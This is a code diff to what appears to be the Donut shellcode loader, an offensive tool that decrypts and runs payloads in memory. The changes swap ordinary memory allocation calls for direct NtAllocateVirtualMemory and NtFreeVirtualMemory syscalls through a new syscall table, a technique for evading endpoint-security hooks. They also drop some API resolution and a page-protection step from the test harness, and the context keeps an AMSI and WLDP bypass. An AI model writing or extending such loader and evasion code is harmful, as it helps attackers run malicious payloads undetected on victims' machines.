@@ -60,14 +60,6 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
         DPRINT("FAILED");
         return (HANDLE)-1;
       }
-      
-      DPRINT("Resolving address of NtContinue");
-      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _NtContinue = (NtContinue_t)xGetProcAddressByHash(inst, hash, inst->iv);
-      
-      DPRINT("Resolving address of GetThreadContext");
-      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetThreadContext = (GetThreadContext_t)xGetProcAddressByHash(inst, hash, inst->iv);
 
       DPRINT("Resolving address of GetCurrentThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
@@ -108,6 +100,9 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     NTSTATUS             nts;
     PCHAR                str;
     CHAR                 path[MAX_PATH];
+    NTSTATUS             status;
+    SIZE_T               rs;
+    PSYSCALL_LIST        syscall_list;
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -160,7 +155,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       // load pointer to data just past len + key
       inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
       
-      DPRINT("Decrypting %li bytes of instance", inst->len);
+      DPRINT("Decrypting %li bytes of instance", inst->len - offsetof(DONUT_INSTANCE, api_cnt));
       
       donut_decrypt(inst->key.mk, 
               inst->key.ctr, 
@@ -234,6 +229,18 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       DPRINT("Module is embedded.");
       mod = (PDONUT_MODULE)&inst->module.x;
     }
+
+    DPRINT("Allocating the syscall table");
+    syscall_list = _VirtualAlloc(NULL, sizeof(SYSCALL_LIST), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    inst->syscall_list = (ULONG_PTR)syscall_list;
+    if (syscall_list == NULL) {
+      // terminate host process?
+      if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
+        DPRINT("Terminating host process");
+        _RtlExitUserProcess(0);
+      }
+      return -1;
+    }
     
     // try bypassing AMSI and WLDP?
     if(inst->bypass != DONUT_BYPASS_NONE) {
@@ -264,11 +271,11 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
         mod->len + sizeof(DONUT_MODULE));
       
       // allocate memory for module information + size of decompressed data
-      unpck = (PDONUT_MODULE)_VirtualAlloc(
-        NULL, ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096, 
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+      unpck = NULL;
+      rs = ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096;
+      status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&unpck, 0, &rs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, syscall_list);
         
-      if(unpck == NULL) goto erase_memory;
+      if(!NT_SUCCESS(status)) goto erase_memory;
       
       // copy the existing information to new block
       DPRINT("Duplicating DONUT_MODULE");
@@ -337,7 +344,8 @@ erase_memory:
         Memset(inst->module.p, 0, (DWORD)inst->mod_len);
         
         // free memory
-        _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
+        rs = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID)&inst->module.p, &rs, MEM_RELEASE, syscall_list);
         inst->module.p = NULL;
       }
     }
@@ -349,6 +357,7 @@ erase_memory:
     Memset(inst, 0, inst->len);
     
     DPRINT("Releasing RW memory for instance");
+    _VirtualFree((PVOID)(ULONG_PTR)inst->syscall_list, 0, MEM_DECOMMIT | MEM_RELEASE);
     _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     
     if(term) {
@@ -421,20 +430,18 @@ int main(int argc, char *argv[]) {
     
     if(inst != NULL) {
       fread(inst, 1, fs.st_size, fd);
+
+      printf("Running...");
+    
+      // run payload with instance
+      h = DonutLoader(inst);
       
-      // change protection to PAGE_EXECUTE_READ
-      if(VirtualProtect((LPVOID)inst, fs.st_size, PAGE_EXECUTE_READ, &old)) {
-        printf("Running...");
-      
-        // run payload with instance
-        h = DonutLoader(inst);
-        
-        if(h != (HANDLE)-1 && inst->oep != 0) {
-          printf("\nWaiting...");
-          WaitForSingleObject(h, INFINITE);
-        }
+      if(h != (HANDLE)-1 && inst->oep != 0) {
+        printf("\nWaiting...");
+        WaitForSingleObject(h, INFINITE);
       }
       // deallocate
+      VirtualFree((LPVOID)(ULONG_PTR)inst->syscall_list, 0, MEM_DECOMMIT | MEM_RELEASE);
       VirtualFree((LPVOID)inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     }
     fclose(fd);
